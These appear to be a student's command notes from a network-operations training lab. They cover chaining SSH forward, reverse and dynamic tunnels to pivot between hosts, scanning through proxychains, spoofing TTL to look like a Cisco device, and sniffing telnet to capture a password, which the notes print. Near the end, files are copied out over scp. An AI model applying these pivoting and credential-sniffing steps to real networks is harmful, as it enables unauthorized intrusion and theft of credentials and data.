ssh net3_student13@10.50.24.228 -L 31301:localhost:22 -NT 
##From IH, this SSHs into the .228, opens listening port 31001 on myself connect to port 22 on the other device.
DO HOST ENUMERATION STUFF, FIGURE OUT WHERE TO GO

ssh net3_student13@localhost -D 9050 -p 31301 -NT
##Well, now I need to scan, so I use the tunnel I just opened to allow for a dynamic tunnel for nmap.

proxychains nmap -Pn 10.1.1.11 -p 21-23,80 -T4
proxychains wget -r 10.1.1.11
proxychains wget -r 10.1.1.11:1918
proxychains wget -r 10.1.1.25

ssh net3_student13@localhost -p 31301 -L 31302:10.1.1.11:23 -NT
##Oh look, an IP that has telnet but not SSH. This connect me to the .228 IP and opens 31002 on internet host, which connects to telnet on the .11

telnet localhost 31302
##Through the newly established port, this connects to telnet on the .11

##Write a sender tcp to a box? Okay!
##On IH, go to /socket.d, sudo nano streamSENDER.py
##Make sure the IP is the box you want to send it to, the port is the listening port on the box and the message is whatever it wants
##proxychains ./streamSENDER.py

##Another box without telnet? No problem!
ssh net3_student13@localhost -p 31301 -L 31303:10.1.1.33:23 -NT
## This connect to CP1 and opens a new listening port on the IH on port 31303 which connects to 10.1.1.33 via port 23

##RIPv2 is running through this IP. Filter on this port!
tcpdump -vv port 520
##This looks at traffic verbously at a specific port

##Oh shucks, I found a new pivot point coming off the IH. 
##I need to scan it but make myself look like a cisco device. 
sudo iptables -t mangle -A POSTROUTING -j TTL --ttl-set 255
##Now my TTL is 255 and I look like cisco.
nmap -Pn -T5 -p- 10.50.27.11
##Just hit a quick port scan.
##Do some ping sweeps

##I can SSH onto the box, but I want my tools on it, so I'm going to set up some tunnels.
ssh net3_student13@10.50.27.11 -p 7777 -L 31304:localhost:7777 -NT
##The above tunnel creates a standard forward tunnel to 10.50.27.11 using it's alternate SSH ports
ssh net3_student13@localhost -D 9050 -p 31304 -NT
##The above tunnel is a dynamic tunnel to let me use my tools.

##In a SSH session on the 10.50.27.11, I ran ifconfig and then a ping sweep of the connected network.
##Then in a IH session, use the proxychains to nmap scan the connected IPs.
proxychains nmap -T4 21-23,80 10.2.2.6,7,14 -p 21-23,80 

##So I found a box that has credentials different than my own as well as SSH runnig on a higher port. 
##It has telnet running, which should allow me to view traffic unencrypted.
##I'll go to the 10.50.27.11 and use TCPDUMP to view traffic
tcpdump -XXvv port 23
##Ran this on the 10.50.27.11 (which has an internal IP of 10.2.2.6) which shows all telnet traffic.
##Got the password from this for the other box with different creds (10.2.2.7) (pwd: Netlifx and Chill)

ssh net3_student13@localhost -p 31304 -L 31305:10.2.2.7:23 -NT
##The above tunnel is going connecting to the 10.50.27.11 via port 31304 (opened earlier), opens port 31305 on myself.
##It then connects to port 23 on 10.2.2.7
telnet localhost 31305 
##This connects to the next box via telnet.
##When on the new box, passive recon time. 
##ifconfig, netstat -antp, etcetera

##find the internal SSH port and now you need to do a reverse tunnel
ssh net3_student13@10.2.2.6 -p 7777 -R 31306:localhost:2222 -NT
##The above tunnel, from .7, connect to the .6 via it's alternate SSH port, opens a new port on the .6 which connects to the .7's alternate port

ssh net3_student13@localhost -p 31304 -L 31307:localhost:31306  -NT
##This bridges the gap from the INTERNETHOST to the .7
##This connects to the .6, then opens a listening port (31307) on the IH 
##This connects to the listening port on the .6 (31306), which jumps to the .7
ssh net3_student13@localhost -p 31307 
##jumps to capstone 07

##Make the next dynamic tunnel
ssh net3_student13@localhost -D 9050 -p 31307 -NT

##From internet host, scan the new hosts via proxychains on the .7
proxychains nmap -T4 10.10.10.1,129,167,140,182 -p 21-23,80 
proxychains wget -r (ALL the ips that have stuff on them)

##Found hosts with alt  SSH ports.

##Going to create a tunnel that goes from IH to the 10.10.10.140
ssh net3_student13@localhost -p 31307 -L 31308:10.10.10.140:301 -NT

##Make a new dynamic tunnel to use your tools on it
ssh net3_student13@localhost -D 9050 -p 31308 -NT

##From the 10.10.10.140, perform passive recon
##From the proxychains, nmap the connected hosts
##proxychains wget -r 192.168.whatever.whocares:webserver port being used

##Need a new tunnel to 10.10.10.167
##Basically just make a identical forward tunnel to the previously used one(see lines 85-89)
##HOW TO SCP: echo "proxychains scp tgt@192.168.1.10:/home/tgt/secret.txt . (use a -P # to specify a port number)
               proxychains scp net3_student13@192.168.10.101:/usr/share/cctc/capstone-analysis.pcap .
##make a new forward port and a new dynamic tunnel, remember to update port numbers

##Go to next box, new forward tunnel 
ssh net3_student13@localhost -p 31307 -L 31310:10.10.10.182:504 -NT
